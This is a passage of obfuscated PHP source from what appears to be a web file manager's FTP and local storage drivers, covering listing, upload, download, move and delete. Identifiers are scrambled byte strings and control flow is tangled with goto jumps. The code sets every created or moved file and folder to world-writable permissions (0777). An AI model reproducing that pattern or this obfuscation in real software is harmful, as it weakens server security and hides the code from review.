$Bì‰Á“Ì›¡[8]; goto a·Ò”’óÄ’; a·Ò”’óÄ’: if (!$d¯‚™ÅÆîà || isset($e™Ä´ßœïŒ[$d¯‚™ÅÆîà])) { continue; } $d¯‚™ÅÆîà = $this->iconvApp($e…øÎ–òè† . ltrim($d¯‚™ÅÆîà, $dÏ„´¤«Ó²[8])); $F¸“¾‘ÀÇé = array($dÏ„´¤«Ó²[28] => $d¯‚™ÅÆîà, $dÏ„´¤«Ó²[29] => $dÏ„´¤«Ó²[192], $dÏ„´¤«Ó²[78] => $Bì‰Á“Ì›¡[4]); goto F¸ÒÇ³á”; F»÷º°ãÑ: if ($b“²¼Ë¶ÕÛ) { $c¡áíÀï›[] = $d¯‚™ÅÆîà; if ($eñ•„Ä©ĞŸ) { $this->fileList($d¯‚™ÅÆîà, $c¡áíÀï›, $eİ»ªŸœ•, $eñ•„Ä©ĞŸ); } continue; } $eİ»ªŸœ•[] = $F¸“¾‘ÀÇé; goto b™±ËÉŞÅ; F¸ÒÇ³á”: if (substr($AİôÇ¯èæ˜, 0, 1) == $dÏ„´¤«Ó²[1253]) { $F¸“¾‘ÀÇé[$dÏ„´¤«Ó²[29]] = $dÏ„´¤«Ó²[77]; $F¸“¾‘ÀÇé[$dÏ„´¤«Ó²[78]] = 0; } $b“²¼Ë¶ÕÛ = $F¸“¾‘ÀÇé[$dÏ„´¤«Ó²[29]] == $dÏ„´¤«Ó²[77] ? !0 : !1; if ($eÖŒ•à ‘²) { $this->cacheMethod($dÏ„´¤«Ó²[198], $d¯‚™ÅÆîà, $b“²¼Ë¶ÕÛ); $this->cacheMethod($dÏ„´¤«Ó²[199], $d¯‚™ÅÆîà, $F¸“¾‘ÀÇé); } goto F»÷º°ãÑ; b™±ËÉŞÅ: } if ($eÖŒ•à ‘²) { $this->cacheMethod($dÏ„´¤«Ó²[198], $e…øÎ–òè†, !0); } goto e¦²å‘®Æ; DËŠÅ÷®ô: $eÖŒ•à ‘² = $this->listItemCache === !1 ? !1 : !0; $DÉÉŒçÜÄ– = @ftp_rawlist($this->connect, $e…øÎ–òè†); if (!$DÉÉŒçÜÄ–) { $DÉÉŒçÜÄ– = array(); } goto cÙ”·çåØ‚; C›§Œí½œ: $dÏ„´¤«Ó² =& $_SERVER[´¬]; $e…øÎ–òè† = $this->iconvSystem($e…øÎ–òè†); if (!$this->isFolder($e…øÎ–òè†)) { return !1; } goto d²Ê¸­«; e¦²å‘®Æ: } private function _listItem($B¶íÒ¶¼Éª) { if (empty($B¶íÒ¶¼Éª)) { return array(); } $F‰ÔÒğĞ» = preg_split($_SERVER[´¬][1254], $B¶íÒ¶¼Éª); if (count($F‰ÔÒğĞ») <= 9) { return $F‰ÔÒğĞ»; } $F‰ÔÒğĞ»[8] = trim(substr($B¶íÒ¶¼Éª, strpos($B¶íÒ¶¼Éª, $F‰ÔÒğĞ»[7]) + strlen($F‰ÔÒğĞ»[7]))); return array_splice($F‰ÔÒğĞ», 0, 9); } public function listPath($Dçö¨‘îö¥, $E‹ßÁ•¶õ = false) { goto bÕ„Úˆ¹™ñ; aÒ½ÉŒåÒî: $this->fileList($Dçö¨‘îö¥, $bÉ¢³°îº†, $F¢Š¥Á¥¨); foreach ($bÉ¢³°îº† as $C¡…  Â => $a¯ÛÔùÎ¯) { $bÉ¢³°îº†[$C¡…  Â] = $this->folderInfo($a¯ÛÔùÎ¯, $E‹ßÁ•¶õ); } foreach ($F¢Š¥Á¥¨ as $C¡…  Â => $a¯ÛÔùÎ¯) { $F¢Š¥Á¥¨[$C¡…  Â] = $this->fileInfo($a¯ÛÔùÎ¯[$FôÔ¼ÊÖÍî[28]], $E‹ßÁ•¶õ, $a¯ÛÔùÎ¯); } goto Bô×ó×àå; bÕ„Úˆ¹™ñ: $FôÔ¼ÊÖÍî =& $_SERVER[´¬]; if (!$this->_isconn()) { return !1; } $bÉ¢³°îº† = $F¢Š¥Á¥¨ = array(); goto aÒ½ÉŒåÒî; Bô×ó×àå: return array($FôÔ¼ÊÖÍî[75] => $bÉ¢³°îº†, $FôÔ¼ÊÖÍî[74] => $F¢Š¥Á¥¨); goto Bˆ‘–¡„ææ; Bˆ‘–¡„ææ: } public function has($A¸æêÅ¨, $dÀ±‡Ú¶„ = false, $BÁËŠèİ¬­ = true) { goto FÆ›ùÒ¬¶Ê; FÆ›ùÒ¬¶Ê: $fÏŞ‹¾ß›é =& $_SERVER[´¬]; $bé‚³†’ÔÕ = $aÓ™ŠÕ£½¦ = array(); $D·ÂÎ£öÔ = $dÀ±‡Ú¶„ ? !0 : !1; goto eÑÎÁŸ»ì“; eÑÎÁŸ»ì“: $this->fileList($A¸æêÅ¨, $bé‚³†’ÔÕ, $aÓ™ŠÕ£½¦, $D·ÂÎ£öÔ); if ($dÀ±‡Ú¶„) { return array($fÏŞ‹¾ß›é[202] => count($aÓ™ŠÕ£½¦), $fÏŞ‹¾ß›é[203] => count($bé‚³†’ÔÕ)); } if ($BÁËŠèİ¬­) { if (count($aÓ™ŠÕ£½¦)) { return !0; } } else { if (count($bé‚³†’ÔÕ)) { return !0; } } goto c‚¼†‹ğ—œ; c‚¼†‹ğ—œ: return !1; goto dŸøÚÖô ; dŸøÚÖô : } public function listAll($AÏ‰¬ê®«‘) { goto d…÷ª½ÀÚÀ; d…÷ª½ÀÚÀ: $CŠ½ˆÎÃ“í =& $_SERVER[´¬]; if (!$this->_isconn()) { return !1; } $EÏŠÔâ¶†¼ = $e‹ÂÄ°‰½Ğ = array(); goto dÁÜŒÌ…ï²; b„¥ÄºŸ: foreach ($EÏŠÔâ¶†¼ as $aƒ—åè®“Ñ) { if (is_string($aƒ—åè®“Ñ)) { $c¼‡Ğ–ì™Œ[$aƒ—åè®“Ñ] = 0; } } return $this->listAllFiles($AÏ‰¬ê®«‘, array_keys($c¼‡Ğ–ì™Œ), $c¼‡Ğ–ì™Œ); goto B™¬ÁËˆ³†; dÁÜŒÌ…ï²: $this->fileList($AÏ‰¬ê®«‘, $EÏŠÔâ¶†¼, $e‹ÂÄ°‰½Ğ, !0); $c¼‡Ğ–ì™Œ = array(); foreach ($e‹ÂÄ°‰½Ğ as $aƒ—åè®“Ñ) { $c¼‡Ğ–ì™Œ[$aƒ—åè®“Ñ[$CŠ½ˆÎÃ“í[28]]] = $aƒ—åè®“Ñ[$CŠ½ˆÎÃ“í[78]]; } goto b„¥ÄºŸ; B™¬ÁËˆ³†: } public function getContent($E‰¢ËÜñÀ¾) { if (!$this->_isconn()) { return !1; } $E‰¢ËÜñÀ¾ = $this->iconvSystem($E‰¢ËÜñÀ¾); return $this->fileSubstr($E‰¢ËÜñÀ¾); } public function setContent($a¯¯ÏËÅ³¡, $E´†Æ¨·â = '') { goto b¼Ğ„·â´µ; b¼Ğ„·â´µ: if (!$this->_isconn()) { return !1; } $F‹á©ªÂâî = $this->pathThis($this->iconvSystem($a¯¯ÏËÅ³¡)); $BŞô³ƒåï° = $this->tempFile($F‹á©ªÂâî); goto bØ…å„Ã¹˜; f¡ŸÛ÷ÉÒ: return $FÍŒ°Ì‚Ş; goto b«ã…Â„î; bØ…å„Ã¹˜: file_put_contents($BŞô³ƒåï°, $E´†Æ¨·â); $FÍŒ°Ì‚Ş = $this->upload($a¯¯ÏËÅ³¡, $this->iconvApp($BŞô³ƒåï°)); $this->tempFileRemve($BŞô³ƒåï°); goto f¡ŸÛ÷ÉÒ; b«ã…Â„î: } public function fileSubstr($b·Ğïß¸®Ï, $cõ“Îƒ¸’ = 0, $EÚÂ•äî– = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($b·Ğïß¸®Ï, $cõ“Îƒ¸’, $EÚÂ•äî–); } private function ftpRequest($DŒªéí£, $C²²–Ôˆ = 0, $e‹Øµğãˆ = false) { goto eµæİéÓ²ï; AÒóÏòµäœ: curl_setopt($E¢Â„ÍÅÈê, CURLOPT_URL, $a¤‡™©±ÊĞ . $this->pathEncode($DŒªéí£)); curl_setopt($E¢Â„ÍÅÈê, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($e‹Øµğãˆ) { $BØó‚Êâ­… = $C²²–Ôˆ + $e‹Øµğãˆ - 1; curl_setopt($E¢Â„ÍÅÈê, CURLOPT_RANGE, "{$C²²–Ôˆ}\x2d{$BØó‚Êâ­…}"); } goto cÜÔçŒ‘òê; cÜÔçŒ‘òê: curl_setopt($E¢Â„ÍÅÈê, CURLOPT_RETURNTRANSFER, 1); $Eòğí¯‘œÛ = curl_exec($E¢Â„ÍÅÈê); curl_close($E¢Â„ÍÅÈê); goto EâÏ³ø¥; EâÏ³ø¥: return $Eòğí¯‘œÛ; goto AæääŠ°¿Â; eµæİéÓ²ï: $DŒªéí£ = $this->iconvSystem($DŒªéí£); $a¤‡™©±ÊĞ = $this->scheme . $this->host . $_SERVER[´¬][4] . $this->port; $E¢Â„ÍÅÈê = curl_init(); goto AÒóÏòµäœ; AæääŠ°¿Â: } public function upload($AïáÁæˆµ, $BÚ‚Š¨¾ç, $aø¾“†ÚÍ« = false, $Fî·ŒÏ­æŠ = REPEAT_REPLACE) { goto f±Ã“âÂº„; f±Ã“âÂº„: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($AïáÁæˆµ))) { return !1; } $AïáÁæˆµ = $this->iconvSystem($AïáÁæˆµ); goto CÙ‚¯—Û›÷; CÙ‚¯—Û›÷: $BÚ‚Š¨¾ç = $this->iconvSystem($BÚ‚Š¨¾ç); $añ£®ÑÃÄ² = ftp_nb_put($this->connect, $AïáÁæˆµ, $BÚ‚Š¨¾ç, FTP_BINARY); while ($añ£®ÑÃÄ² == FTP_MOREDATA) { $añ£®ÑÃÄ² = ftp_nb_continue($this->connect); } goto dŞ¸áÄùÒ; dŞ¸áÄùÒ: if ($añ£®ÑÃÄ² != FTP_FINISHED) { return !1; } return $this->getPathOuter($AïáÁæˆµ); goto a¤Ê·ãÉÆ; a¤Ê·ãÉÆ: } public function download($fİ°Ÿ×¬, $CÇ‚ªô›Ã‚ = '') { goto Bó²Ñ„¹„; Bó²Ñ„¹„: if (!$this->_isconn()) { return !1; } $E¹½¨íœáâ = $this->pathFather($CÇ‚ªô›Ã‚); if (!IO::mkdir($E¹½¨íœáâ)) { return !1; } goto E·Ì‚«Ÿ­â; fİ°é¬¾›: while ($Cğº¤Ë„× == FTP_MOREDATA) { $Cğº¤Ë„× = ftp_nb_continue($this->connect); } if ($Cğº¤Ë„× != FTP_FINISHED) { return !1; } return $this->iconvApp($CÇ‚ªô›Ã‚); goto CçÕò…Ñ¹; E·Ì‚«Ÿ­â: $fİ°Ÿ×¬ = $this->iconvSystem($fİ°Ÿ×¬); $CÇ‚ªô›Ã‚ = $this->iconvSystem($CÇ‚ªô›Ã‚); $Cğº¤Ë„× = ftp_nb_get($this->connect, $CÇ‚ªô›Ã‚, $fİ°Ÿ×¬, FTP_BINARY); goto fİ°é¬¾›; CçÕò…Ñ¹: } public function exist($Bˆâ‰”ä¤«) { return $this->isFile($Bˆâ‰”ä¤«) || $this->isFolder($Bˆâ‰”ä¤«); } public function isFile($A¤Â¸ÎÓ¸) { return !$this->isFolder($A¤Â¸ÎÓ¸) && $this->objectMeta($A¤Â¸ÎÓ¸); } public function isFolder($AëàíøÜ ÷) { return $this->cacheMethod($_SERVER[´¬][198], $AëàíøÜ ÷); } protected function objectMeta($DÅœÅ‚çñù) { return $this->cacheMethod($_SERVER[´¬][199], $DÅœÅ‚çñù); } protected function _objectMeta($D¡î¢¿á®) { goto d†Ô°Íì…Ä; d†Ô°Íì…Ä: $A±İÖîºâ =& $_SERVER[´¬]; if ($D¡î¢¿á® == $A±İÖîºâ[33] || $D¡î¢¿á® == $A±İÖîºâ[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto eæíÑğ”Éë; eæíÑğ”Éë: $D¡î¢¿á® = $this->iconvSystem($D¡î¢¿á®); $BãÒ‚ŞÊƒ = array($A±İÖîºâ[28] => $this->iconvApp($D¡î¢¿á®), $A±İÖîºâ[29] => $A±İÖîºâ[192], $A±İÖîºâ[78] => 0); @ftp_chdir($this->connect, $A±İÖîºâ[8]); goto f·Ì´İÙ±…; f·Ì´İÙ±…: $fç¬¦ï› = @ftp_size($this->connect, $D¡î¢¿á®); if ($fç¬¦ï› != -1) { $BãÒ‚ŞÊƒ[$A±İÖîºâ[78]] = $fç¬¦ï›; } else { $a¡‘‰áõº = @ftp_chdir($this->connect, $D¡î¢¿á®); if (!$a¡‘‰áõº) { return !1; } $BãÒ‚ŞÊƒ[$A±İÖîºâ[29]] = $A±İÖîºâ[77]; } return $BãÒ‚ŞÊƒ; goto bĞòĞ˜Ô•¹; bĞòĞ˜Ô•¹: } protected function _isFolder($EòÊ÷Şõ…·) { $aÇæœİäç =& $_SERVER[´¬]; if ($EòÊ÷Şõ…· == $aÇæœİäç[33] || $EòÊ÷Şõ…· == $aÇæœİäç[8]) { return !0; } $D·²Š™‘‚Ã = $this->_objectMeta($EòÊ÷Şõ…·); return isset($D·²Š™‘‚Ã[$aÇæœİäç[29]]) && $D·²Š™‘‚Ã[$aÇæœİäç[29]] == $aÇæœİäç[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($C×êá‹Ç) { if (substr($C×êá‹Ç, 0, 2) == $_SERVER[´¬][1245]) { $C×êá‹Ç = BASIC_PATH . substr($C×êá‹Ç, 2); } return $C×êá‹Ç; } public function iconvApp($fË²Ğ‰÷á) { $Eëõ±½ =& $_SERVER[´¬]; global $config; return $this->iconvTo($fË²Ğ‰÷á, $config[$Eëõ±½[1243]], $config[$Eëõ±½[1242]]); } public function iconvSystem($CæÚÉ“æà) { $Fõ±„é¨„è =& $_SERVER[´¬]; global $config; return $this->iconvTo($CæÚÉ“æà, $config[$Fõ±„é¨„è[1242]], $config[$Fõ±„é¨„è[1243]]); } public function getPathOuter($cè›¸â‰ ¾) { goto e¶ŒÁªõŠ¿; eä»Ò•ìŒ: return $this->pathDriver . $cæµÑ»â™ò[8] . ltrim($cè›¸â‰ ¾, $cæµÑ»â™ò[8]); goto fßµ½º¨Â“; fÈø‚‰—²—: if (substr($D‚ÊÏ’‰Á, 0, 2) == $cæµÑ»â™ò[1245]) { $D‚ÊÏ’‰Á = BASIC_PATH . substr($D‚ÊÏ’‰Á, 2); } if (substr($cè›¸â‰ ¾, 0, 2) == $cæµÑ»â™ò[1245]) { $cè›¸â‰ ¾ = BASIC_PATH . substr($cè›¸â‰ ¾, 2); } $D‚ÊÏ’‰Á = KodIO::clear($D‚ÊÏ’‰Á); goto bÖ¸¶Ğ­»†; bÖ¸¶Ğ­»†: $cè›¸â‰ ¾ = KodIO::clear($cè›¸â‰ ¾); $cè›¸â‰ ¾ = substr($cè›¸â‰ ¾, strlen($D‚ÊÏ’‰Á)); if (empty($this->pathDriver)) { return $cè›¸â‰ ¾; } goto eä»Ò•ìŒ; e¶ŒÁªõŠ¿: $cæµÑ»â™ò =& $_SERVER[´¬]; $D‚ÊÏ’‰Á = $this->iconvApp($this->pathBase); $cè›¸â‰ ¾ = $this->iconvApp($cè›¸â‰ ¾); goto fÈø‚‰—²—; fßµ½º¨Â“: } public function mkfile($FÎ¶öä»†, $B•ƒÙ¾ÇÍÌ = '', $FÚÑªĞÍ” = REPEAT_RENAME) { $FÎ¶öä»† = $this->iconvSystem($FÎ¶öä»†); @touch($FÎ¶öä»†); if ($B•ƒÙ¾ÇÍÌ) { file_put_contents($FÎ¶öä»†, $B•ƒÙ¾ÇÍÌ); } @chmod($FÎ¶öä»†, 511); return is_file($FÎ¶öä»†) ? $this->getPathOuter($FÎ¶öä»†) : !1; } public function mkdir($c½ŒŠ®×ö¹, $e‰Ó›ˆ„°Í = REPEAT_SKIP) { $c½ŒŠ®×ö¹ = $this->iconvSystem($c½ŒŠ®×ö¹); if (is_dir($c½ŒŠ®×ö¹)) { return $this->getPathOuter($c½ŒŠ®×ö¹); } @mkdir($c½ŒŠ®×ö¹, 511, !0); @chmod($c½ŒŠ®×ö¹, 511); return is_dir($c½ŒŠ®×ö¹) ? $this->getPathOuter($c½ŒŠ®×ö¹) : !1; } public function copyFile($E£àÜÃø˜, $C•ƒŒã™†) { $this->mkdir($this->pathFather($C•ƒŒã™†)); $E£àÜÃø˜ = $this->iconvSystem($E£àÜÃø˜); $C•ƒŒã™† = $this->iconvSystem($C•ƒŒã™†); $EÏÄ‹»ìñ = copy_64($E£àÜÃø˜, $C•ƒŒã™†); @chmod($C•ƒŒã™†, 511); return $EÏÄ‹»ìñ ? $this->getPathOuter($C•ƒŒã™†) : !1; } public function moveFile($cã†öëÎ •, $cäø÷™Ö÷) { goto E³›ì×†¬; A†©¡—åÑ°: $bÅğé‹î = intval(@rename($cã†öëÎ •, $cäø÷™Ö÷)); if (!$bÅğé‹î) { if ($bÅğé‹î = intval(@copy_64($cã†öëÎ •, $cäø÷™Ö÷))) { @unlink($cã†öëÎ •); } } @chmod($cäø÷™Ö÷, 511); goto D¼Ñ«ƒé×; D¼Ñ«ƒé×: return $bÅğé‹î ? $this->getPathOuter($cäø÷™Ö÷) : !1; goto CÂØĞøíÃ; E³›ì×†¬: $this->mkdir($this->pathFather($cäø÷™Ö÷)); $cã†öëÎ • = $this->iconvSystem($cã†öëÎ •); $cäø÷™Ö÷ = $this->iconvSystem($cäø÷™Ö÷); goto A†©¡—åÑ°; CÂØĞøíÃ: } public function delFile($cÌŞÆŒ©­¥) { $cÌŞÆŒ©­¥ = $this->iconvSystem($cÌŞÆŒ©­¥); if (!@unlink($cÌŞÆŒ©­¥)) { @chmod($cÌŞÆŒ©­¥, 511); if (!@unlink($cÌŞÆŒ©­¥)) { return !1; } } else { return !0; } } public function delFolder($D²×ŠË“£¯) { goto f’³¤“…ÕŒ; f’³¤“…ÕŒ: $dŒ½Æ±­²ù =& $_SERVER[´¬]; $D²×ŠË“£¯ = $this->iconvSystem($D²×ŠË“£¯); if (!is_dir($D²×ŠË“£¯)) { return !0; } goto cÜÊä”„¡; eåµÁ•Í–: return rmdir($D²×ŠË“£¯); goto FïÙŸÇÁöŠ; cÜÊä”„¡: if (!($fß»ó—¤ÃÂ = opendir($D²×ŠË“£¯))) { return !1; } while (($AïŒØëéæö = readdir($fß»ó—¤ÃÂ)) !== !1) { if ($AïŒØëéæö == $dŒ½Æ±­²ù[95] || $AïŒØëéæö == $dŒ½Æ±­²ù[1252]) { continue; } $BÜ½ï’¬á˜ = $D²×ŠË“£¯ . $dŒ½Æ±­²ù[8] . $AïŒØëéæö; if (is_file($BÜ½ï’¬á˜) || is_link($BÜ½ï’¬á˜)) { if (!unlink($BÜ½ï’¬á˜)) { chmod($BÜ½ï’¬á˜, 511); if (!unlink($BÜ½ï’¬á˜)) { return !1; } } } else { if (is_dir($BÜ½ï’¬á˜)) { chmod($BÜ½ï’¬á˜, 511); $BÜ½ï’¬á˜ = $this->iconvApp($BÜ½ï’¬á˜); if (!$this->delFolder($BÜ½ï’¬á˜)) { return !1; } } } } closedir($fß»ó—¤ÃÂ); goto eåµÁ•Í–; FïÙŸÇÁöŠ: } public function rename($E–´ãï ›Î, $EšÜòç¼ç) { goto EÚ¦ğšÓØº; dõÏÉ„ñ­: $A¼ìß¡ºâ¡ = @rename($E–´ãï ›Î, $BÆ†àí¶£º); $BÆ†àí¶£º = $this->iconvApp($BÆ†àí¶£º); return $A¼ìß¡ºâ¡ ? $this->getPathOuter($BÆ†àí¶£º) : !1; goto DÙÎÎ—­; AŒÍÎ’¥„°: $E–´ãï ›Î = $this->iconvSystem($E–´ãï ›Î); $FçÖ ›°Ë = $this->pathFather($E–´ãï ›Î); $BÆ†àí¶£º = rtrim($FçÖ ›°Ë, $E¼·Â°”èÓ[8]) . $E¼·Â°”èÓ[8] . $C»ÆçÈ”ÀÕ; goto dõÏÉ„ñ­; EÚ¦ğšÓØº: $E¼·Â°”èÓ =& $_SERVER[´¬]; $C»ÆçÈ”ÀÕ = $this->fileNameAuto($this->pathFather($E–´ãï ›Î), $EšÜòç¼ç); $C»ÆçÈ”ÀÕ = $this->iconvSystem($C»ÆçÈ”ÀÕ); goto AŒÍÎ’¥„°; DÙÎÎ—­: } public function size($D²÷“òÍÅ) { $D²÷“òÍÅ = $this->iconvSystem($D²÷“òÍÅ); return filesize_64($D²÷“òÍÅ); } public function info($F†Ò‹ôØ¾ˆ) { $F†Ò‹ôØ¾ˆ = $this->iconvSystem($F†Ò‹ôØ¾ˆ); if ($this->isFolder($F†Ò‹ôØ¾ˆ)) { return $this->folderInfo($F†Ò‹ôØ¾ˆ); } else { if ($this->isFile($F†Ò‹ôØ¾ˆ)) { return $this->fileInfo($F†Ò‹ôØ¾ˆ); } } return !1; } protected function infoChildren($dÛ­ê”‰Îå, &$E·ª‡·÷, $bçŸê¥©ø¼ = true) { goto A¶¹‡õÁ±…; c‰á‚‡: if ($bçŸê¥©ø¼) { $dÛ­ê”‰Îå = $this->iconvSystem($dÛ­ê”‰Îå); } if (!($dŞ¦†õªß‘ = @opendir($dÛ­ê”‰Îå))) { return; } while (($EĞÒ´‘ÓÕ = readdir($dŞ¦†õªß‘)) !== !1) { if ($EĞÒ´‘ÓÕ == $DÍ£÷èÉ¦­[95] || $EĞÒ´‘ÓÕ == $DÍ£÷èÉ¦­[1252]) { continue; } $eòˆê‘½Â† = $dÛ­ê”‰Îå . $EĞÒ´‘ÓÕ; if (is_file($eòˆê‘½Â†) || is_link($eòˆê‘½Â†)) { $E·ª‡·÷[$DÍ£÷èÉ¦­[79]]++; $E·ª‡·÷[$DÍ£÷èÉ¦­[78]] += filesize_64($eòˆê‘½Â†); } else { if (is_dir($eòˆê‘½Â†)) { $E·ª‡·÷[$DÍ£÷èÉ¦­[80]]++; $this->infoChildren($eòˆê‘½Â†, $E·ª‡·÷, !1); } } } goto aí¥‘”Œì¸; A¶¹‡õÁ±…: $DÍ£÷èÉ¦­ =& $_SERVER[´¬]; check_abort_echo(); $dÛ­ê”‰Îå = rtrim($dÛ­ê”‰Îå, $DÍ£÷èÉ¦­[8]) . $DÍ£÷èÉ¦­[8]; goto c‰á‚‡; aí¥‘”Œì¸: closedir($dŞ¦†õªß‘); goto fëŒ±†¢®; fëŒ±†¢®: } private function folderInfo($b¢ëÑ î’ç, $Cõ‘˜¨Ü¥ = false) { $c½ªÃ«óÛ =& $_SERVER[´¬]; $b¢ëÑ î’ç = rtrim($b¢ëÑ î’ç, $c½ªÃ«óÛ[8]) . $c½ªÃ«óÛ[8]; $e¸’Ş‚³Ë = $this->iconvApp($this->pathThis($b¢ëÑ î’ç)); if ($Cõ‘˜¨Ü¥) { return array($c½ªÃ«óÛ[28] => $e¸’Ş‚³Ë, $c½ªÃ«óÛ[76] => $this->getPathOuter($b¢ëÑ î’ç), $c½ªÃ«óÛ[29] => $c½ªÃ«óÛ[77]); } $dôÕã‡ßõŸ = array($c½ªÃ«óÛ[28] => $e¸’Ş‚³Ë, $c½ªÃ«óÛ[76] => $this->getPathOuter($b¢ëÑ î’ç), $c½ªÃ«óÛ[29] => $c½ªÃ«óÛ[77], $c½ªÃ«óÛ[193] => @filectime($b¢ëÑ î’ç), $c½ªÃ«óÛ[84] => @filemtime($b¢ëÑ î’ç), $c½ªÃ«óÛ[1255] => @fileatime($b¢ëÑ î’ç), $c½ªÃ«óÛ[1256] => is_readable($b¢ëÑ î’ç), $c½ªÃ«óÛ[1257] => is_writable($b¢ëÑ î’ç), $c½ªÃ«óÛ[1258] => get_mode($b¢ëÑ î’ç)); return $dôÕã‡ßõŸ; } private function fileInfo($cÃ£Õ–áí‹, $c…µˆÊÎ¨Œ = false) { $B‰¸‰¹ÑÁá =& $_SERVER[´¬]; $bÍôÜ¶©ËÉ = $this->iconvApp($this->pathThis($cÃ£Õ–áí‹)); if ($c…µˆÊÎ¨Œ) { return array($B‰¸‰¹ÑÁá[28] => $bÍôÜ¶©ËÉ, $B‰¸‰¹ÑÁá[76] => $this->getPathOuter($cÃ£Õ–áí‹), $B‰¸‰¹ÑÁá[29] => $B‰¸‰¹ÑÁá[192], $B‰¸‰¹ÑÁá[78] => $this->size($cÃ£Õ–áí‹), $B‰¸‰¹ÑÁá[168] => $this->ext($bÍôÜ¶©ËÉ)); } $b¢´”ß ´ò = array($B‰¸‰¹ÑÁá[28] => $bÍôÜ¶©ËÉ, $B‰¸‰¹ÑÁá[76] => $this->getPathOuter($cÃ£Õ–áí‹), $B‰¸‰¹ÑÁá[29] => $B‰¸‰¹ÑÁá[192], $B‰¸‰¹ÑÁá[193] => @filectime($cÃ£Õ–áí‹), $B‰¸‰¹ÑÁá[84] => @filemtime($cÃ£Õ–áí‹), $B‰¸‰¹ÑÁá[1255] => @fileatime($cÃ£Õ–áí‹), $B‰¸‰¹ÑÁá[78] => $this->size($cÃ£Õ–áí‹), $B‰¸‰¹ÑÁá[168] => $this->ext($bÍôÜ¶©ËÉ), $B‰¸‰¹ÑÁá[1256] => is_readable($cÃ£Õ–áí‹), $B‰¸‰¹ÑÁá[1257] => is_writable($cÃ£Õ–áí‹), $B‰¸‰¹ÑÁá[1258] => get_mode($cÃ£Õ–áí‹)); return $b¢´”ß ´ò; } public function exist($E¶ÇÙß‰†) { $E¶ÇÙß‰† = $this->iconvSystem($E¶ÇÙß‰†); return @file_exists($E¶ÇÙß‰†); } public function isFile($AÆ®Ù”µ±) { $AÆ®Ù”µ± = $this->iconvSystem($AÆ®Ù”µ±); return @is_file($AÆ®Ù”µ±); } public function isFolder($AçÁĞ›ä†) { $AçÁĞ›ä† = $this->iconvSystem($AçÁĞ›ä†); return @is_dir($AçÁĞ›ä†); } public function listPath($Cª¡‘ãÛÖ§, $e—“Øôƒ½ = false) { goto A™ª¾‘Ÿ´Ò; A™ª¾‘Ÿ´Ò: $fõã“ÊÍ™ =& $_SERVER[´¬]; $Cª¡‘ãÛÖ§ = $this->iconvSystem($Cª¡‘ãÛÖ§); $Cª¡‘ãÛÖ§ = rtrim($Cª¡‘ãÛÖ§, $fõã“ÊÍ™[8]) . $fõã“ÊÍ™[8]; goto Cä÷è™µ†Ó; Cä÷è™µ†Ó: $FİÛ™£“Š = array($fõã“ÊÍ™[75] => array(), $fõã“ÊÍ™[74] => array()); if (!($C§¾ØÉÎ—ª = @opendir($Cª¡‘ãÛÖ§))) { return $FİÛ™£“Š; } while (($f¨øáÌàã£ = readdir($C§¾ØÉÎ—ª)) !== !1) { if ($f¨øáÌàã£ == $fõã“ÊÍ™[95] || $f¨øáÌàã£ == $fõã“ÊÍ™[1252]) { continue; } $F¾ß É±ï‘ = $Cª¡‘ãÛÖ§ . $f¨øáÌàã£; if (is_file($F¾ß É±ï‘)) { $FİÛ™£“Š[$fõã“ÊÍ™[74]][] = $this->fileInfo($F¾ß É±ï‘, $e—“Øôƒ½); } else { $FİÛ™£“Š[$fõã“ÊÍ™[75]][] = $this->folderInfo($F¾ß É±ï‘, $e—“Øôƒ½); } } goto B‘‹ÍŠ¿Á–; B‘‹ÍŠ¿Á–: closedir($C§¾ØÉÎ—ª); return $FİÛ™£“Š; goto Cºêê“®°; Cºêê“®°: } public function listAll($aÉ–âÂ†“Ú, &$dÍôµîõ£® = array()) { goto Eğ·í¿šğ¶; Fõ†›Ğ¾Á: return $dÍôµîõ£®; goto BÕäÜÑ›Ñ; Eğ·í¿šğ¶: $F–‹š Çš =& $_SERVER[´¬]; $aÉ–âÂ†“Ú = $this->iconvSystem($aÉ–âÂ†“Ú); $aÉ–âÂ†“Ú = rtrim($aÉ–âÂ†“Ú, $F–‹š Çš[8]) . $F–‹š Çš[8]; goto f¬¤“¶°Š; f¬¤“¶°Š: if (!($dƒ¦Î¾èö = @opendir($aÉ–âÂ†“Ú))) { return $dÍôµîõ£®; } while (($aÂØÑ„´ÄĞ = readdir($dƒ¦Î¾èö)) !== !1) { if ($aÂØÑ„´ÄĞ == $F–‹š Çš[95] || $aÂØÑ„´ÄĞ == $F–‹š Çš[1252]) { continue; } $C«¿Öİ Ï = $aÉ–âÂ†“Ú . $aÂØÑ„´ÄĞ; if (is_dir($C«¿Öİ Ï) && !is_link($C«¿Öİ Ï)) { $dÍôµîõ£®[] = array($F–‹š Çš[76] => $C«¿Öİ Ï . $F–‹š Çš[8], $F–‹š Çš[77] => 1, $F–‹š Çš[84] => @filemtime($C«¿Öİ Ï), $F–‹š Çš[78] => 0); $this->listAll($C«¿Öİ Ï, $dÍôµîõ£®); } else { $dÍôµîõ£®[] = array($F–‹š Çš[76] => $C«¿Öİ Ï, $F–‹š Çš[77] => 0, $F–‹š Çš[84] => @filemtime($C«¿Öİ Ï), $F–‹š Çš[78] => $this->size($C«¿Öİ Ï)); } } closedir($dƒ¦Î¾èö); goto Fõ†›Ğ¾Á; BÕäÜÑ›Ñ: } public function has($EêŞç‹›Å, $dõåµ®ö˜¸ = false, $dğ·˜ˆñÆˆ = true) { goto fÛ”ÀÜçŞ¢; cïÇ£ùˆ¶Ğ: if ($dõåµ®ö˜¸) { return array($DëÌ‡“œÕµ[202] => $Fè“×³È÷, $DëÌ‡“œÕµ[203] => $cà™ÁŠšì‡); } return !1; goto a­‚Ä“à; BãïòĞÖê¹: $fùâ»åÇİ  = 0; while (($EµÇÓ‡êÓñ = readdir($dÆŞÅ  ¤É)) !== !1) { if ($EµÇÓ‡êÓñ == $DëÌ‡“œÕµ[95] || $EµÇÓ‡êÓñ == $DëÌ‡“œÕµ[1252]) { continue; } $Fëƒ·ÙÔ³ = $EêŞç‹›Å . $EµÇÓ‡êÓñ; if ($dõåµ®ö˜¸) { $fùâ»åÇİ ++; if (@is_file($Fëƒ·ÙÔ³)) { $Fè“×³È÷++; } else { $cà™ÁŠšì‡++; } if ($fùâ»åÇİ  > 10000) { break; } continue; } if 